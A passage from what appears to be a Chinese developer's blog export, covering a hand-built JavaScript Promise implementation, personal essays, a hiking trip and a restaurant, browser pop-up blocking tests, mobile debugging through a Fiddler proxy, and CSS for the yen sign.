rejected，由于后续事务都是承接前一事务的，前一事务已经宣告工程已经玩不成了，那么后续的所有事务都会将自己标记为 rejected，其标记理由（reason）就是出错事务的报错信息（这个报错信息可以使用 try…catch 来捕获，也可以通过程序自身来捕获，如 ajax 的 onerror 事件、ajax 返回的状态码为 404 等）。小结：Promise 就是一个事务的管理器。他的作用就是将各种内嵌回调的事务用流水形式表达，其目的是为了简化编程，让代码逻辑更加清晰。由于整个程序的实现比较难理解，对于 Promise，我们将分为两部分阐述：无错误传递的 Promise，也就是事务不会因为任何原因中断，事务队列中的事项都会被依次处理，此过程中 Promise 只有 pending 和 resolved 两种状态，没有 rejected 状态。包含错误的 Promise，每个事务的处理都必须使用容错机制来获取结果，一旦出错，就会将错误信息传递给下一个事务，如果错误信息会影响下一个事务，则下一个事务也会 rejected，如果不会，下一个事务可以正常执行，依次类推。二、无错误传递的 Promise（简化版的 Promise）首先，我们需要用一个变量（status）来标记事务的状态，然后将事务（affair）也保存到 Promise 对象中。 12345var Promise = function(affair)&#123; this.state = &quot;pending&quot;; this.affair = affair || function(o) &#123; return o; &#125;; this.allAffairs = [];&#125;; Promise 有两个重要的方法，一个是 then，另一个是 resolve：then，将事务添加到事务队列（allAffairs）中resolve，开启流程，让整个操作从第一个事务开始执行在操作事务之前，我们会先把各种事务依次放入事务队列中，这里会用到 then 方法： 12345678910Promise.prototype.then = function (nextAffair)&#123; var promise = new Promise(); if (this.state == &quot;resloved&quot;)&#123; // 如果当前状态是已完成，则这个事务将会被立即执行 return this._fire(promise, nextAffair); &#125;else&#123; // 否则将会被加入队列中 return this._push(promise, nextAffair); &#125;&#125;; 如果整个操作已经完成了，那 then 方法送进的事务会被立即执行， 1234567891011Promise.prototype._fire = function (nextPromise, nextAffair)&#123; var nextResult = nextAffair(this.result); if (nextResult instanceof Promise)&#123; nextResult.then(function(obj)&#123; nextPromise.resolve(obj); &#125;); &#125;else&#123; nextPromise.resolve(nextResult); &#125; return nextPromise;&#125;; 被立即执行之后会返回一个结果，这个结果会被传递到下一个事务中作为原料，但是这里需要考虑两种情况： 异步，如果这个结果也是一个 Promise，则需要等待这个 Promise 执行完毕再将最终的结果传到下一个事务中。 同步，如果这个结果不是 Promise，则直接将结果传递给下一个事务。 第一种情况还是比较常见的，比如我们在一个事务中有一个子事务队列需要处理，此时必须等待子事务完成才能回到主事务队列中。 1234567891011121314Promise.prototype.resolve = function (obj)&#123; if (this.state != &quot;pending&quot;) &#123; throw &quot;流程已完成，不能再次开启流程！&quot;; &#125; this.state = &quot;resloved&quot;; // 执行该事务，并将执行结果寄存到 Promise 管理器上 this.result = this.affair(obj); for (var i = 0, len = this.allAffairs.length; i &lt; len; ++i)&#123; // 往后执行事务 var affair = this.allAffairs[i]; this._fire(affair.promise, affair.affair); &#125; return this;&#125;; resolve 接受一个参数，这个数据是交给第一个事务来处理的，因为第一个事务的启动可能需要点原料，这个数据就是原料，它也可以是空。该事物处理完毕之后，将操作结果（result）寄存在 Promise 对象上，方便引用，然后将结果（result）作为原料送入下一个事务。依次类推。 我们看到 then 方法中还调用了一个 _push ，这个方法的作用是将事务推进事务管理器（Promise）。 1234567Promise.prototype._push = function (nextPromise, nextAffair)&#123; this.allAffairs.push(&#123; promise: nextPromise, affair: nextAffair &#125;); return nextPromise;&#125;; 以上操作，我们就实现了一个简单的事务管理器，可以测试下下面的代码： 123456789101112131415161718// 初始化事务管理器var promise = new Promise(function(data)&#123; console.log(data); return 1;&#125;);// 添加事务promise.then(function(data)&#123; console.log(data); return 2;&#125;).then(function(data)&#123; console.log(data); return 3;&#125;).then(function(data)&#123; console.log(data); console.log(&quot;end&quot;);&#125;);// 启动事务promise.resolve(&quot;start&quot;); 可以看到依次输出的结果为： 12345&gt; start&gt; 1&gt; 2&gt; 3&gt; end 由于上述实现十分简陋，链式调用没做太好的处理，请读者自行完善：） 下面是一个异步操作演示： 123456789101112131415161718var promise = new Promise(function(data)&#123; console.log(data); return &quot;end&quot;;&#125;);promise.then(function(data)&#123; // 这里需要返回一个 Promise，让主事务切换到子事务处理 return (function(data)&#123; // 创建一个子事务 var promise = new Promise(); setTimeout(function()&#123; console.log(data); // 一秒之后才启动子事务，模拟异步延时 promise.resolve(); &#125;, 1000); return promise; &#125;)(data);&#125;);promise.resolve(&quot;start&quot;); 可以看到依次输出的结果为： 12&gt; start&gt; end （1s之后输出） 将函数写的稍微好看点： 1234567891011121314151617function delay(data)&#123; // 创建一个子事务 var promise = new Promise(); setTimeout(function()&#123; console.log(data); // 一秒之后才启动子事务，模拟异步延时 promise.resolve(); &#125;, 1000); return promise;&#125;// 主事务var promise = new Promise(function(data)&#123; console.log(data); return &quot;end&quot;;&#125;);promise.then(delay);promise.resolve(&quot;start&quot;); 三、包含错误传递的 Promise 真的很羡慕你能看到这么详细的文章，当然，后面会更加精彩！没有错误处理的 Promise 只能算是一个半成品，虽说可以通过在最外层加一个 try..catch 来捕获错误，但没法具体定位是哪个事务发生的错误。并且这里的错误不仅仅包含 JavaScript Error，还有诸如 ajax 返回的 data code 不是 200 的情况等。先看一个浏览器内置 Promise 的实例（该代码可在现代浏览器下运行）： 1234567891011new Promise(function(resolve, reject)&#123; resolve(&quot;start&quot;);&#125;).then(function(data)&#123; console.log(data); throw &quot;error&quot;;&#125;).catch(function(err)&#123; console.log(err); return &quot;end&quot;;&#125;).then(function(data)&#123; console.log(data)&#125;); Promise 的回调和 then 方法都是接受两个参数： 12345678new Promise(function(resolve, reject)&#123; // ...&#125;);promise.then( function(value)&#123;/* code here */&#125;, function(reason)&#123;/* code here */&#125;); 事务处理过程中，如果有值返回，则作为 value，传入到 resolve 函数中，若有错误产生，则作为 reason 传入到 reject 函数中处理。在初始化 Promise 对象时，若传入的回调中没有执行 resolve 或者 reject，这需要我们主动去启动事务队列。 12promise.resolve();promise.reject(); 上面两种都是可以启动一个队列的。这里跟第二章第二节的 resolve 函数用法类似。Promise 对象还提供了 catch 函数，起用法等价于下面所示： 123promise.catch();// 等价于promise.then(null, function(reason)&#123;&#125;); 还有两个 API： 12promise.all();promise.race(); 后续再讲。先看看这个有错误处理的 Promise 是如何实现的。 123456function Promise(resolver)&#123; this.status = &quot;pending&quot;; this.value = null; this.handlers = []; this._doPromise.call(this, resolver);&#125; _doPromise 方法在实例化 Promise 函数时就执行。如果送入的回调函数 resolver 中已经 resolve 或者 reject 了，程序就已经启动了，所以在实例化的时候就开始判断。 123456789101112131415_doPromise: function(resolver)&#123; var called = false, self = this; try&#123; resolver(function(value)&#123; // 如果没有 call 则继续，并标记 called 为 true !called &amp;&amp; (called = !0, self.resolve(value)); &#125;, function(reason)&#123; // 同上 !called &amp;&amp; (called = !0, self.reject(reason)); &#125;); &#125; catch(e) &#123; // 同上，捕获错误，传递错误到下一个 then 事务 !called &amp;&amp; (called = !0, self.reject(e)); &#125;&#125;, 只要 resolve 或者 reject 就会标记程序 called 为 true，表示程序已经启动了。 12345678910111213141516171819202122resolve: function(value) &#123; try&#123; if(this === value)&#123; throw new TypeError(&quot;流程已完成，不能再次开启流程！&quot;); &#125; else &#123; // 如果还有子事务队列，继续执行 value &amp;&amp; value.then &amp;&amp; this._doPromise(value.then); &#125; // 执行完了之后标记为完成 this.status = &quot;fulfilled&quot;; this.value = value; this._dequeue(); &#125; catch(e) &#123; this.reject(e); &#125;&#125;,reject: function(reason) &#123; // 标记状态为出错 this.status = &quot;rejected&quot;; this.value = reason; this._dequeue();&#125;, 可以看到，每次 resolve 的时候都会用一个 try..catch 包裹来捕获未知错误。 12345678_dequeue: function()&#123; var handler; // 执行事务，直到队列为空 while (this.handlers.length) &#123; handler = this.handlers.shift(); this._handle(handler.thenPromise, handler.onFulfilled, handler.onRejected); &#125;&#125;, 无论是 resolve 还是 reject 都会让程序往后奔流，直到结束所有事务，所以这两个方法中都有 _dequeue 函数。 1234567891011121314151617181920212223_handle: function(thenPromise, onFulfilled, onRejected)&#123; var self = this; setTimeout(function() &#123; // 判断下次操作采用哪个函数，reject 还是 resolve var callback = self.status == &quot;fulfilled&quot; ? onFulfilled : onRejected; // 只有是函数才会继续回调 if (typeof callback === &quot;function&quot;) &#123; try &#123; self.resolve.call(thenPromise, callback(self.value)); &#125; catch(e) &#123; self.reject.call(thenPromise, e); &#125; return; &#125; // 否则就将 value 传递给下一个事务了 self.status == &quot;fulfilled&quot; ? self.resolve.call(thenPromise, self.value) : self.reject.call(thenPromise, self.value); &#125;, 1);&#125;, 这个函数跟上一节提到的 _fire 类似，如果 callback 是 function，就会进入子事务队列，处理完了之后退回到主事务队列。最后一个 then 方法，将事务推进队列。 123456789101112131415then: function(onFulfilled, onRejected)&#123; var thenPromise = new Promise(function() &#123;&#125;); if (this.status == &quot;pending&quot;) &#123; this.handlers.push(&#123; thenPromise: thenPromise, onFulfilled: onFulfilled, onRejected: onRejected &#125;); &#125; else &#123; this._handle(thenPromise, onFulfilled, onRejected); &#125; return thenPromise;&#125; 如果第二节没有理解清楚，这一节也会让人头疼，这一部分讲的比较粗糙。第三章 异步编程一、jQuery 中的 Defferred 对象或许你在面试的时候，有面试官问你：$.ajax() 执行后返回的结果是什么？在 jQuery1.5 版本就已经引入了 Defferred 对象，当时为了引入这个东西，整个 jQuery 都被重构了。Defferred 跟 Promise 类似，它表示一个还未完成任务的对象，而 Promise 确切的说，是一个代表未知值的对象。 1234567$.ajax(&#123; url: url&#125;).done(function(data, status, xhr)&#123; //...&#125;).fail(function()&#123; //...&#125;); 回忆下第二章第一节中的 Promise，是不是如出一辙，只是 jQuery 还提供了更多的语法糖： 123456789$.ajax(&#123; url: url, success: function(data)&#123; //... &#125;, error: funtion()&#123; //... &#125;&#125;); 他允许将 done 和 fail 两个函数的回调放在 ajax 初始化的参数 success 和 fail 上，其原理还是一样的，同样，还有这样的东西： 12345$.when(taskOne, taskTwo).done(function () &#123; console.log(&quot;都执行完毕后才会输出我！&quot;);&#125;).fail(function()&#123; console.log(&quot;只要有一个失败，就会输出我！&quot;)&#125;); 当 taskOne 和 taskTwo 都完成之后才执行 done 回调，这个浏览器内置的 Promise 也有对应的函数： 123Promise.all([true, Promise.resolve(1), ...]).then(function(value)&#123; //....&#125;); 浏览器内置的 Promise 还提供了一个 API： 12345Promise.race([true, Promise.resolve(1), ...]).then(function(value)&#123; //....&#125;, function(reason)&#123; //...&#125;); 只要 race 参数中有一个 resolve 或者 reject，then 回调就会出发。二、基于事件响应的异步模型@朴灵 写的 EventProxy 就是基于事件响应的异步模型，按理说，这个实现的逻辑是最清晰的，不过代码量稍微多一点。 1234567891011121314151617function taskA()&#123; setTimeout(function()&#123; var result = &quot;A&quot;; E.emit(&quot;taskA&quot;, result); &#125;, 1000);&#125;function taskB()&#123; setTimeout(function()&#123; var result = &quot;B&quot;; E.emit(&quot;taskB&quot;, result); &#125;, 1000);&#125;E.all([&quot;taskA&quot;, &quot;taskB&quot;], function(A, B)&#123; return A + B;&#125;); 我没有看他的源码，但是想想，应该是这个逻辑。只需要在消息中心管理各个 emit 以及消息注册。这里的错误处理值得思考下。 在半年前，也写过一篇关于异步编程的文章：JavaScript异步编程原理，感兴趣的可以去读一读。 第四章 小结 一、小结 文章比较长，阅读了好几天别人写的东西，自己提笔还是比较轻松的，本文大概花费了 6 个小时撰写。 本文主要解说了 Promise 的应用场景和实现原理，如果你能够顺畅的读完全文并且之处文中的一些错误，说明你已经悟到了：） Promise 使用起来不难，但是理解其原理还是有点偏头痛的，所以下面列举的几篇相关阅读也建议读者点进去看看。 二、相关阅读 JavaScript PromisesPromise 初探JavaScript中的异步梳理（0）JavaScript中的异步梳理（2）&mdash;&mdash;使用Promises/AjQuery的Deferred对象JavaScript中的Promise和Deferred对象 第二部分：实战MDNJavaScript异步编程原理]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>异步</tag>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工作半年多了]]></title>
    <url>%2Fblog%2F2014%2F09%2F29%2F2014-09-29-%E5%B7%A5%E4%BD%9C%E5%8D%8A%E5%B9%B4%E5%A4%9A%E4%BA%86%2F</url>
    <content type="text"><![CDATA[加上实习，已经在外头工作半年多了。 大四上学期在北京飘荡了三个月，认识了不少朋友，离开北京之后，交往少了，感情也淡了。好像一直都是这样，从小学到大学再到大学毕业，相知相识的人很多很多，可是一旦分离，时间就会冲淡一切。 现在在杭州，阿里巴巴工作。过的还是有些平淡了。 一直没有停止技术上追求卓越的脚步，现在也算是打下了扎实的基础。而大学四年的记忆却因自己懒于回忆而渐渐淡去，或许是时候停下脚步，整理整理凌乱的思绪，想想前路应该怎么走。 很多同学临近毕业之时，甚至在毕业之后依然处于懵懂茫然的状态，不知道自己追求的是什么，更不知道自己在这个社会扮演什么样的角色。 我的建议是：提高自己，勿忘初心。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我们的技术“落后”于国外？]]></title>
    <url>%2Fblog%2F2014%2F09%2F28%2F2014-09-28-why-we-behind-the-world%2F</url>
    <content type="text"><![CDATA[淘宝将 XTemplate 从 KISSY 中分离出来，作为单独的模板工具以迎合阿里巴巴各种 前端/node端 需求，今天在群里看到一个老外介绍 XTemplate 的文章链接，顿生感慨。 英语是世界语，中国人懂英文是比较正常的事情，但是很少会有国人使用英文撰写博客，这就直接锐减了我们的信息出口，从而减少了老外主动跟我们交流的机会。 技术的进步不仅需要有一堆人埋头苦干，更重要的环节是将埋头苦干的研究成果分享出来，老外们的分享，我们很容易获取到，不仅仅是我们，全世界都能获取并且方便理解，可是中文内容的分享不以为然，所以今天在老外的博客中看到国人的研究成果，让我感慨万千。 国内的技术氛围相当浓烈，经常能在圈子里看到优秀的文章产出，很多文章也是同步于最新技术的，从这个角度来看，国内的技术并没有落后国外，或者说并没有落后多少。上次也看到裕波邀请国外的技术大牛来华演讲，这足以说明国内技术向外扩展的渴望和趋势。 现在我们应该静下心来思考，如何让国外的技术圈子更加了解中国的技术发展，如何创建一个与国外程序员交流的平台！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闲扯三国]]></title>
    <url>%2Fblog%2F2014%2F09%2F23%2F2014-09-23-%E9%97%B2%E6%89%AF%E4%B8%89%E5%9B%BD%2F</url>
    <content type="text"><![CDATA[孙坚之后有孙策，孙策之后有孙权，周瑜辅佐孙权，周公瑾死后有鲁子敬，子敬病毙，又有吕蒙，阿蒙挂了还有陆逊，四位军事家相继辅佐孙权，他也算有福气。还有一个三世元老，子布老头，为江东大管家，为孙仲谋管钱、管粮、管兵器，真可谓碉之堡也！ 再看看曹操和刘备，曹操那边，荀彧（文若）死后倒是出了个司马懿，不过仲达老先生领着儿子把曹丕给做了。玄德就更惨了，死后阿斗活啃诸葛孔明←_← 孙权跟诸葛亮站一起，感觉有点怪怪的~ 话锋转回来，为何江东多才俊？（本来标题是『为何江东多才俊』，写到一半给改了）我们先来看看孙字辈的一家人，孙权从小就足智多谋，跟着父亲和哥哥，学了不少本事，胆量也杠杆的！再看看周瑜，周公瑾是一个雄才，韬略伟岸，志存高远，还是自学的。但是后边几位…难道 TM 都是自学的么，真是不可思议！ 江东多才俊，为何多才俊还取不了天下？说到底还是儿子不争气，孙权的儿子一个个地争王位，窝里反，争就争吧，还没一个叼的，都是草包，草包旁边也都没个军师，所以家事处不好就别想着争天下了。 曹操的几个儿子里头，曹冲很聪明，但显露才华太耀眼，最后被兄弟干死，曹彰是个愣头青，目标就是做将军，杀尽强敌，曹植是个醉鬼，每日跟着宾客吟诗歌赋，雅兴勃勃，自在不已。唯独曹丕，世人眼里平淡无奇，实则牛逼烘烘，暗藏韬晦，这也是仲达选择辅佐他的原因。 上次已经表达了我对曹操的敬畏之情，不再赘述。这里要说说刘备。以仁义为本，曾被曹操追着打时，带着二十万百姓逃命，若不是江夏有个小弟照应，早挂了。每取一州郡，便抚民安民，施之以仁义，按理这是很高明的做法，但也致使了若师出无“正义军”名便不能随便夺人家城池，搞的诸葛亮取西川的时候纠结的蛋疼，最后还是凤雏庞统舍身而得正义之名。 来来来，干了这杯，还有下杯~ 刘备的两个兄弟，一个是莽夫，一个视天下如蝼蚁，傲视群雄，大意失荆州，真搞不懂怎么还那么多人供奉他（黑社会供着还可以理解，竟还有人供他为财神）。兄弟之情让刘备的军营像个山寨，刘备是个山大王，关羽和张飞只怕哥哥刘备，其他人都当成狗屎，故多次违抗军令，最后被人剁头也是情理之中。 好了，今天就扯到这里，欲知后文，请待下回分解！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>三国演义</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[徽杭古道游记]]></title>
    <url>%2Fblog%2F2014%2F09%2F21%2F2014-09-21-%E5%BE%BD%E6%9D%AD%E5%8F%A4%E9%81%93%E6%B8%B8%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[平日里抱久了电脑，内网偶现旅行的帖子，赶紧地报了个名。 徽杭古道，西起安徽伏岭镇，东至浙江马啸乡，延绵二十多公里，算是个国家 4A 级的的旅游景点。 早上五点多起来，到公司之后随着 150 人的庞大队伍向古道行进。领队是我们 Team 的龙俊哥哥，这让我有了不少安全感。大清早，在等待其他同事到来之前，大巴师傅开着车去了趟加油站，很清楚的看到，1000 元的柴油，于是扒开地图一看，单程 200 多公里，路途颇为遥远。 我比较喜欢爬山，虽然没走两步就气喘吁吁了。第一次爬过的像样点的山是武当山，跟着几个大学同学一起过去，爬到半山腰时，队伍已经远远的将我甩下，当时我进也不是，退也不是，因为无论进退都得两三个小时，只要掏出手机，咬咬牙，听着音乐一步一步的向前迈进。 遥遥几百公里，几乎都是穿山而过，不得不感叹社会的发展给我们的生活带来的便利，也不得不反思大自然因人类无止尽的追求而受到的破坏。在车上，领队也特意强调了环境保护的问题，他让我们每人都带着一个垃圾收纳袋，将旅行过程产生的垃圾都带回来，毕竟城市对垃圾的处理能力要强于自然区。 途中经过了《倩女幽魂》的拍摄地，隔着车窗拍了一张。 两块巨石相隔，可惜车跑的太快，加上路道树木过多，没有拍到要点。古道给人整体的感觉就是，山和水溶为一体，处处都有流水声，走进古道之前，就有所体会。 防止拉伤，我们驻足在古道入口，放下书包和登山杖，跟着领队做热身运动。 不过热身运动的照片我没有拍:)。刚走进去还是一路平川 前十分钟还未看到阶梯，所以也能悠悠的拍上几张，风景着实不错，主要是空气清新，吸不到城市的 pm2.5 。 昨天下了场小雨，我们还担心今日没法出行，得上天眷顾，施舍了我们一天的太阳，十多分钟之后，渐渐的踏入了窄道。 山虽不高，梯度却是十分明显，所以我们可以看到比较湍急的流水。 水很清，也有点凉，凉水洒在脸上，感觉自然的气息很美妙。下面是我和室友的一张合影，（打个广告，室友单身，靠谱，年轻有为） 在狭路上向下俯视，瞬间来了一阵尿意，胆小的女生双腿也会微微颤栗，确实很高。 走在前面，回头看看大家，姑娘也是挺多的。 自从发了福之后，豪气就没有当年那么明显了。 20km 走罢，人已经从杭州走进了安徽，到了另一个入口——江南第一关。 最后看一眼徽派建筑，就得拖着疲惫的身躯回家了。 徽杭古道，其高度，对于我来说，恰到好处，不至于太累，但是也够呛。实在是太久太久没有走出门了，选个适合自己的徒步景区，放松下心情，也是极好的。 一路下来，有两点东西，让我感触颇深。一个是环境，一个是对自然的敬畏。 其实两者都是自然对人的反作用力。徽杭古道沿途的垃圾还是有点多了，领队跟我们说，『自然拥有分解有机物的能力，但是如果每个过来旅游的人都扔一个香蕉皮，丢一片垃圾，自然的分解能力是否赶得上人类对它的伤害？』这个问题不用思考我们就知道答案，但是出行的人是否真的将这个答案放在心底呢？ 第二点，对自然的敬畏。领队说，『尽量不要做出任何反自然的行为』，如踢开脚下的石头，折断挡路的树枝，踩死脚下的虫蚁等等，这些都属于反自然的行为，野外行走，放松是一方面，学会保护自己更是需要关注的另一方面，做不了的事情不要太逞能，在野外受伤（或者挂了）的人很多都属于逞能型的；也不要跟自然作对，一切都做都应该是轻缓的，最小伤害的。 这些也是本次出行最大的收获！]]></content>
      <categories>
        <category>笔记本</category>
        <category>在路上</category>
      </categories>
      <tags>
        <tag>游记</tag>
        <tag>徽杭古道</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[千岛湖土菜馆]]></title>
    <url>%2Fblog%2F2014%2F09%2F17%2F2014-09-17-%E5%8D%83%E5%B2%9B%E6%B9%96%E5%9C%9F%E8%8F%9C%E9%A6%86%2F</url>
    <content type="text"><![CDATA[曾在北京实习了三个月，百度的伙食，两个字形容，“难吃”！ 也可能是常在公司吃饭，吃腻了。那时，也是经常拉着同事到附近的餐馆凑一桌，氛围挺好，可每次等菜的时间却又太长，所以在吃饭这点，一直特别不满意。 都说杭州是个地美人美的地方，最近有点不敢苟同了。我住在余杭区，前些年这里繁荣程度一般。或许是因为阿里巴巴搬到了西溪，亦或许是因为城里住的人太多房子不够了，高楼在四处缓缓升起。 这些天，无数卡车、水泥车在路上猖狂流窜，扬尘漫天，已经颇受不了这环境了！今天去“千岛湖土菜馆”的路上就深有此感！ 下过几次土菜馆，这一家的口味相当赞，物美价廉，老板还比较体贴。骑着三辆小电驴，沿着下面的路线，朝目的地奔去。 五个人，点了七个菜 尖椒肉丝（辣） 酱爆螺丝 葱油鳊鱼 蒜泥空心菜 韭菜炒蛋 干锅土豆 还有个啥，记不起来了，本来是110元，使用淘点点下来，少付了20元。 尖椒确实有点辣，不过还是一扫而空，螺丝是那种比较小的，尾部用钳子钳开，只需前头一嗦，鲜肉立马出来，所以在我们那边也管着叫“嗦螺”。葱油鳊鱼，这道菜挺不错，只是鳊鱼腹部有些类似肥膘的肉，不够好吃，这鱼是先用蒸笼蒸熟，然后热油淋过，撒上葱花，加些酱油制成，回头自己定要尝试一番！ 干锅土豆，火料放的有点多，吃到一半，烧干了，我们的大厨龙俊师傅，果断撩起茶壶，注水约100ml，味道倍儿棒！韭菜炒蛋就没的说了，好像是第二个上的，我还没怎么上筷子，已经没有了，饥民伤不起啊~ 我只是想表达，阿里的食堂和周边比百度好很多，仅此而已。 -EOF-]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>吃</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[window.open被浏览器拦截]]></title>
    <url>%2Fblog%2F2014%2F09%2F07%2F2014-09-07-onclick-in-javascript%2F</url>
    <content type="text"><![CDATA[我们都知道浏览器会拦截非鼠标触发的 window.open 事件，不同浏览器的处理不统一，如 chrome 还支持键盘触发 open，而 firefox 只允许鼠标左键触发，etc. 在低版本 IE 下，我们可以使用 ActiveXObject 或者 Object 新开一个页面，如： // IE Only var o=new ActiveXObject(&quot;WMPlayer.OCX&quot;); o.launchURL(&quot;http://barretlee.com&quot;); 如果用户禁用了 WMP 对象，自然也是弹不出来的，值得注意的是，此处打开页面的是系统默认浏览器，而不是正在执行该脚本的浏览器，因为 WMP 使用的是自己的方法开打页面，跟浏览器没有任何关系。 我也尝试在页面中插入一个空的 iframe ，然后在 iframe 中打开链接，不通。也尝试过模拟事件来触发 click，依然不行。 open 页面，浏览器会跟踪事件源，如果不是外部设备输入的而是 javascript 执行的信号，此次 open 将被浏览器拦截（浏览器设置了允许某个 URL 弹窗除外）。 根据这个问题，我也测试了下，浏览器的反应时间： // 点击页面后，出现弹窗 document.onclick = function(){ setTimeout(function(){ open(&quot;http://barretlee.com&quot;) }, 1000); } // 点击页面后，出现未弹窗 document.onclick = function(){ setTimeout(function(){ open(&quot;http://barretlee.com&quot;) }, 1001); } 根据上面的测试，可以知道浏览器对外部设备信号的感知允许 1s 的延迟，为了排除进程阻塞的干扰，加了个 while 循环 1s： document.onclick = function(){ var t = new Date*1; while(new Date*1 - t &lt; 1000){} setTimeout(function(){ open(&quot;http://barretlee.com&quot;) }, 1000) } 上面代码并没有弹窗。 由此可以确定用户操作，浏览器允许的响应时间就是 1s 了。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>浏览器拦截</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PC远程调试移动设备]]></title>
    <url>%2Fblog%2F2014%2F08%2F29%2F2014-08-29-cb-remote-debug-in-mobile-development%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 我们在移动端进行前端开发时，会遇到一个让人头痛但不得不面对的问题&mdash;&mdash;调试。在 PC 机器上，我们有功能强大的 Chrome DevTools、Firebug，即便是老版本的 IE ，我们也可以安装微软提供的插件，对网页样式和请求信息轻松进行调试。但在手机、平板上，很多人就无招可施了，一个劲的 alert 查看调试信息。如果你已经厌倦了可爱又可恨的 alert 弹窗，请继续往下阅读。一、先说说调试的原理设备浏览器中输入一个 URL，它会向 URL 所在的 server 请求资源： 123+-------------+ +---------------+| client |--------→| Internet |+-------------+ +---------------+ 此时，数据是从 client 和 目标 server 之间的隐秘交互，除非 server 端的代码是由我们自己控制，否则很难了解他们之间都做了什么信息传递。如果 server 传过来的代码存在 bug，此时我们就相当纠结了。比较常见的情景是，该 server 就是我们的测试机器，我们在测试机器上开发，通过一个移动设备 client 来实施调试代码，常用的调试方式就是修改 server 代码，再实时查看 client 的响应。但是，问题来了。某天，Barret 发现 client 端页面显示有 bug，由于 client 请求的目标 server 是线上，不像平时的测试机器，我们可以随意修改代码然后查看效果，并且线上的代码都是经过压缩和打包了的，很难阅读，怎么办？于是，我想到了使用代理： 12345678+-------------+ \ / +---------------+| client |-----×---→| Internet |+-------------+ / \ +---------------+ | ↑ | | | +-------------+ | +----→| proxy |-----+ +-------------+ 我们在 client 端做相应配置，让他的请求强制指向 proxy，然后 proxy 转发请求到目标 server，proxy 上的请求和响应都是透明的，通过篡改 client 到 proxy 的请求，或者篡改 server 到 proxy 的响应，就可以实时查看这些人为修改在 client 端的效果了。本文目的就是说明 proxy 是如何操作的。二、通过 Fiddler 代理windows 下著名的 http(s) 代理软件 fiddler 使用比较广泛，mac 下可以使用 charles 代理，由于使用人群相对偏少，本文就不细说，感兴趣的可以 PM 我。charles 是一个跨平台的软件，windows 下也可以使用，不过个人偏好 fiddler。OK，我们来看看 fiddler 是如何一步一步完成网络代理的。1. 配置客户端这里说的客户端包括手机、平板甚至电脑。一般的 android / IOS 设备都可以设置代理：step 1. 当连接好网络之后（相信你在一个 wifi 环境下进行开发），点击右侧的箭头按钮，我使用的是 android 手机，IOS 也比较好找，在 设置&gt;Wi-Fi 中找到对应的网络，右侧有个圆圈包着的 i 图标，点击进入：step 2.&nbsp;一般代理方式有两种，手动和自动，将其设置为手动，然后填写，你电脑的 IP（为啥呢？因为 proxy 是你的电脑，client 的请求要全部转发到你的电脑上，然后使用 fiddler 软件去分析/替换请求），windows 下使用 ipconfig 可以看到本机 IP，linux/unix 下使用 ifconfig 查看：step 3.&nbsp;设置端口，端口可以随意设置，但最好大于 3000，数值比较小的端口可能被系统占用了。这里需要注意一点，由于 client 相对我们电脑的 fiddler 来说是一个远程设备，所以要在 Allow Remote Computers to Connert 选项上打上勾勾。step 4.&nbsp;进入手机浏览器，输入网址：step 5.&nbsp;然后把你的眼睛挪到电脑屏幕上看看 fiddler：到这里，我相信你已经看明白了整个 proxy 的原理。至于 fiddler 如何替换包，如何修改包，如果调试，不是本文叙述的重点，下面演示一个简单的替换。2. 调试请求百度的页面，我们把百度的 logo 换成博客园的：step 1. 在 AutoResponder 中添加一项：step 2. 进入你的浏览器（UC下清空缓存，如果缓存中有百度图片，他会使用缓存，并不发出这个请求），打开百度页面：然后你就发现，貌似哪里有点不对~ 除此之外，你还可以将线上文件替换到本地，比如线上的 xyz-min.js 替换成本地的 xyz.js 然后修改 xyz.js 的内容，直接调试线上 bug，异常方便！三、其他工具有人会说，我没有实体机，那我建议你在电脑上安装虚拟机，android 和 IOS 的虚拟机都比较好安装。有人会说，我电脑太卡，跑不动虚拟机，那我建议你就是用上述方式。有人会说，…..，（如果没实体机也没虚拟机，那你开发个毛线呀）。Fiddler 和 Charles 都是 HTTP(s) 层的抓包软件，如果你是 websocket 开发调试，建议使用 wireshark，网络七层协议，这个软件能抓除数据链路层之外的所有层信息，出于安全考虑，它抓到的包是不能篡改的。还有一些比较好用的工具，如利用 pac 文件配置系统代理，weinre 调试等，这里简单介绍下 weinre：1. 安装1npm install –g weinre2. 打开1weinre -httpPort 7999 -boundHost -all-httpPort 监听端口boundHost –all- 绑定主机3. 说明都写在图片里头，相信聪明的你可以悟到四、小结移动端开发不比 PC 轻松，调试只是需要注意的一个小点，还有很多很多未知的东西等着我们去探索，本文也算是抛砖引玉，如果您有更好的移动端调试方案，希望可以分享出来，一起交流。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>移动端调试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[￥符号，少了一横]]></title>
    <url>%2Fblog%2F2014%2F08%2F29%2F2014-08-29-dollar-in-different-face%2F</url>
    <content type="text"><![CDATA[跟钱有关的问题。 数值前加一个 ￥ 符号，可是视觉同学一定要使用两横的 dollar 符号。咋弄？ 这个符号在不同字体下呈现的效果是不一样的，微软雅黑下是两横，不过显示的并不好看，正确的处理方式应该是： &lt;style&gt;i {font-family:&quot;Microsoft Yahei&quot;;}&lt;/style&gt; &lt;i&gt;&amp;yen;&lt;/i&gt;]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>css</tag>
